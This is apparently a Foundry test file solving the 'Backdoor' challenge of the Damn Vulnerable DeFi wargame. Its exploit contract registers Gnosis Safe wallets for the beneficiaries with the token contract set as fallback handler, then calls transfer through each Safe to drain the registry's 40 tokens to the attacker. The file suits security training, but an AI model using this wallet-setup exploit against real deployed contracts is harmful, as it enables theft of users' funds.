// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";

contract Backdoor is Test {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        vm.label(alice, "Alice");
        bob = users[1];
        vm.label(bob, "Bob");
        charlie = users[2];
        vm.label(charlie, "Charlie");
        david = users[3];
        vm.label(david, "David");

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);

        /**
         * WalletRegistry checks:
         * 1. calldata starts with GnosisSafe.setup.selector
         * 2. owners.length == 1
         * 3. threshold == 1
         * 4. initializer has to be an abi.encodeWithSelector(GnosisSafe.setup.selector, args...);
         */

        /**
         * Exploit: deploy 4 dummy Safe contracts, call setup() setting the owners to be the beneficiaries
         * then call proxyCreated manually, passing as proxy the attacker address.
         */

        Exploiter exploiter = new Exploiter(
            users,
            masterCopy,
            walletFactory,
            walletRegistry,
            address(dvt)
        );

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract Exploiter is Test {
    address[] users;
    GnosisSafe masterCopy;
    GnosisSafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;
    address dvt;
    address payable attacker;

    constructor(
        address[] memory _users,
        GnosisSafe _masterCopy,
        GnosisSafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry,
        address _dvt
    )
        public
    {
        attacker = payable(msg.sender);
        users = _users;
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        dvt = _dvt;

        bytes memory setupData;
        address[] memory owners = new address[](1);
        address[] memory safes = new address[](4);
        bytes memory selector = abi.encodePacked(GnosisSafe.setup.selector);

        for (uint256 i = 0; i < 4;) {
            owners[0] = users[i];
            setupData = abi.encodeWithSelector(
                GnosisSafe.setup.selector, owners, 1, address(0), hex"", dvt, address(0), 0, payable(address(0))
            );
            safes[i] = address(walletFactory.createProxyWithCallback(address(masterCopy), setupData, 0, walletRegistry));

            safes[i].call(abi.encodeWithSignature("transfer(address,uint256)", attacker, 10 ether));
            unchecked {
                ++i;
            }
        }
    }
}
